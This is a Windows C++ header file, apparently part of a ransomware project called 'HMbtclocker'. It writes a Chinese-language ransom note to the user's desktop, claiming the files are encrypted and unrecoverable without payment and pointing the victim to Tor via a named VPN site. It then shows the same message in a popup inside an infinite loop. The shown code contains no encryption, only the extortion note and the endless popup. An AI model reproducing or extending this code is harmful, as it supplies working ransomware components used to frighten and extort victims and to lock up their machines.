#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <shlobj.h>

// 获取桌面路径
std::wstring getDesktopPath() {
    wchar_t desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
        return std::wstring(desktopPath);
    }
    return L"";
}

// 封装主要功能到一个函数
void createTxtAndShowMessage() {
    // 获取桌面路径
    SetConsoleOutputCP(CP_UTF8);
    std::wstring desktopPath = getDesktopPath();
    if (desktopPath.empty()) {
        std::wcout << L"无法获取桌面路径" << std::endl;
        return;
    }

    // 拼接文件名
    std::wstring filePath = desktopPath + L"\\myFile.txt";

    // 预设的文件内容
    std::wstring fileContent = L"你的文件已被加密\n"
        L"如果想解密软件请用tor服务器访问网站：\n"
        L"安装tor需要vpn,ikuuu.one是一个vpn网站，之后再在torproject.org上下载tor\n"
        L"你的文件是无法恢复的，除非支付费用\n"
        L"HMbtclocker欢迎你的使用\n"
        L"让这个文件内容变得更加丰富多样。\n";

    // 创建并写入文件
    std::wofstream outFile(filePath);
    if (!outFile.is_open()) {
        std::wcout << L"无法打开文件 " << filePath << std::endl;
        return;
    }
    outFile << fileContent;
    outFile.close();

    // 预设的弹窗内容

    std::wstring messageBoxContent = L"你的文件已被加密,如果想解密软件请用tor服务器访问网站：安装tor需要vpn,ikuuu.one是一个vpn网站，之后再在torproject.org上下载tor 你的文件是无法恢复的，除非支付费用 HMbtclocker欢迎你的使用,tor解密网站网址为：";
    while (1) {
        MessageBoxW(NULL, messageBoxContent.c_str(), L"提示", MB_OK);
    }
    // 弹出消息框

}


